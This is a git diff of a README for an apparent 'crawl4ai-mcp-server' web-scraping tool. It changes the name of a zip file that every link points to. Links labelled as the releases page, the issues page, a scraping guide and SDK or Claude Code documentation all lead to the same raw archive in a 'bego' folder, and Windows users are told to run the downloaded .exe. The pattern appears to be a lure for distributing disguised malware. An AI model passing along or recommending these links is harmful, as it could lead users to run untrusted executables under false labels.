@@ -1,6 +1,6 @@
 # 🕷️ crawl4ai-mcp-server - Simple Setup for Web Scraping Tools
 
-[![Download Latest Release](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip)
 
 ## 🌟 Overview
 
@@ -13,7 +13,7 @@ To get started with the crawl4ai-mcp-server, you will need to download and run i
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip) to find the latest version of the crawl4ai-mcp-server. 
+   Go to the [Releases page](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip) to find the latest version of the crawl4ai-mcp-server. 
 
 2. **Download the Latest Release**  
    Look for the latest version and click on it to view the available files. You will find options suitable for your operating system.
@@ -21,9 +21,9 @@ To get started with the crawl4ai-mcp-server, you will need to download and run i
 3. **Choose Your File**  
    Download the appropriate file for your system. You may see options like:
 
-   - ***Windows:*** https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip
+   - ***Windows:*** https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip
    - ***macOS:*** crawl4ai-mcp-server-macos
-   - ***Linux:*** https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip
+   - ***Linux:*** https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip
 
 4. **Install the Application**  
    - For **Windows:** Double-click the downloaded .exe file to start the installation. Follow the on-screen instructions.
@@ -82,15 +82,15 @@ If you encounter issues during installation or usage, consider the following:
 
 - **Check Compatibility:** Ensure your operating system and version match the requirements.
 - **Review Logs:** Check the logs generated in the server directory for error messages.
-- **Community Support:** Visit the project's [GitHub Issues page](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip) or join community discussions for help.
+- **Community Support:** Visit the project's [GitHub Issues page](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip) or join community discussions for help.
 
 ## 📚 Additional Resources
 
 For more information on web scraping and using the crawl4ai-mcp-server, check these resources:
 
-- [Web Scraping Guide](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip)
-- [OpenAI Agents SDK Documentation](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip)
-- [Getting Started with Claude Code](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl4ai-mcp-server.zip)
+- [Web Scraping Guide](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip)
+- [OpenAI Agents SDK Documentation](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip)
+- [Getting Started with Claude Code](https://raw.githubusercontent.com/amienbou121/crawl4ai-mcp-server/master/bego/crawl_mcp_ai_server_v2.3-beta.1.zip)
 
 ## 🏁 Conclusion
 
